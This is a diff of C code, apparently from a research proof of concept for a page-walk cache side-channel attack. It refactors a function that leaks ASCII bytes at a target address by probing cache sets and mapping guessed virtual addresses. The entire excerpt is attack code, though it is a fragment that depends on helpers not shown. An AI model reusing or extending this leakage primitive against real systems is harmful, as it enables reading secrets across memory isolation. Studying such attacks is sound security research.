@@ -2,6 +2,7 @@
 
 
 // TODO mark where is this used? 
+// TODO BETTER NAMING, this kind of sucks and is confusing 
 /*
    leak_pwsc_non_buffered - leaks just the nonbuffered value in addr
    input: addr
@@ -32,63 +33,57 @@ struct pwsc_ans leak_pwsc_ptr(uint64_t addr, uint64_t *init_noise_filter) {
 
 
 /*
-    leak_ascii: optimized function for ASCII characters --> we only need a page walk depth of 1 
-*/
-struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t previous_line) {
-    // grab byte inital 6 bits 
+ *  leak_ascii -  Optimized function for ASCII characters: we only need a page walk depth up to VPN4 (depth 1)
+ *  Inputs:     Address under target, initial noise filter config, expected VPN4 value
+ *  Outputs:    pwsc_ans with a complete VPN4 value and VPN3 cache set value. This allows the caller 
+ *              to reconstruct one ASCII character
+ *  Assumptions: `expected_vpn4_value` is set to `ncache_lines` if there is not an expected value
+ */
+struct pwsc_ans leak_ascii(uint64_t addr, uint64_t *init_noise_filter, uint64_t expected_vpn4_value) {
+    
+    // Determine VPN4 cache set (this leaks the initial 6 bits of the ascii character)
     struct pwsc_ans init_pwsc_ans; init_pwsc_ans.va.va = 0; init_pwsc_ans.num_lines_found = 0;
     uint64_t initial_line = leak_pwsc_non_buffered(addr, init_noise_filter);
-    // fprintf(stderr, "Found non-buffered line: %llu\n", initial_line);
     if(initial_line != ncache_lines) {
         init_pwsc_ans.va.vpn4_set = initial_line;
         init_pwsc_ans.num_lines_found = 1;
 
-        if(previous_line != ncache_lines && initial_line != previous_line)
-            fprintf(stderr, "[WARNING] previous line does not match this line\n"); // TODO retry if this is hit
+        if(expected_vpn4_value != ncache_lines && initial_line != expected_vpn4_value)
+            fprintf(stderr, "[WARNING] previous line does not match this line\n");
     }
     else {
-        init_pwsc_ans.va.vpn4_set = previous_line; // if no previous line this should be set to ncache_lines 
-        init_pwsc_ans.num_lines_found = 0; // line technically not found 
+        init_pwsc_ans.va.vpn4_set = expected_vpn4_value;
+        init_pwsc_ans.num_lines_found = 0;
     }
-
-    // segfault guard
-    if(init_pwsc_ans.va.vpn4_set > 31) {
-        return init_pwsc_ans; 
-    }
-
-    // guess CO values till we find one 
+    
+    // Determine the VPN4 CO bits (since it is an ascii character we only need to leak 2 more bits)
     for(uint8_t co_guess = 0; co_guess < 4; co_guess++) {
 
-        // create address 
+        // Map our guess
         struct pwsc_ans guess = init_pwsc_ans; 
-        guess.va.vpn4_co = co_guess<<1; // the LSB of VPN4 is always 0 
-
-        // map it 
-        // TODO implement retry if the mmap fails 
+        guess.va.vpn4_co = co_guess<<1; // The least significant bit of the CO is always 0 (since ASCII secret here)
         char *va_buffer = mmap((void *)guess.va.va, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_FIXED_NOREPLACE, -1, 0);
         if(va_buffer == (void *)-1) {
-            fprintf(stderr, "mmap in leak depth one failed :(\n");
+            fprintf(stderr, "[ERROR] mmap in leak_ascii failed :(\n");
             return init_pwsc_ans;
         }
-        *va_buffer = 0x5A; // shouldn't be needed passed in populate flag 
+        *va_buffer = 0x5A;
 
-        // check if guess is right 
-        struct pwsc_ans status; status.va.va = 0;
+        // Check if our guess is correct
+        // ****Please note! that if the vpn4 set and vpn3 set are equal this will not be able to 
+        // find a value. This allows for faster performance and simplier code but can lead to a
+        // small drop in accuracy. In the future it might be worthwhile to upgrade this to avoid 
+        // this issue. 
         uint64_t found_line = leak_pwsc_non_buffered(addr, init_noise_filter); 
-        status.num_lines_found = (found_line != ncache_lines);
-        status.va.vpn4_set = found_line; 
         munmap((void *)guess.va.va, 4096); 
-
-        // logic 
-        if(status.num_lines_found == 1 && status.va.vpn4_set != init_pwsc_ans.va.vpn4_set) {
-            guess.va.vpn3_set = status.va.vpn4_set; 
-            return guess; 
-        } else if (status.num_lines_found == 0 && init_pwsc_ans.num_lines_found == 1) { // we actually found an initial line 
-            // TODO change this logic --> unncessarily complicated I think 
+        if((found_line != ncache_lines) && found_line != init_pwsc_ans.va.vpn4_set) {
+            guess.va.vpn3_set = found_line; 
             return guess; 
         }
+
     }
-    fprintf(stderr, "[WARNING] CACHE OFFSET UNKNOWN HERE .....\n");
+
+    fprintf(stderr, "[WARNING] Unable to find cache offset :(!\n");
     return init_pwsc_ans; 
 }
 
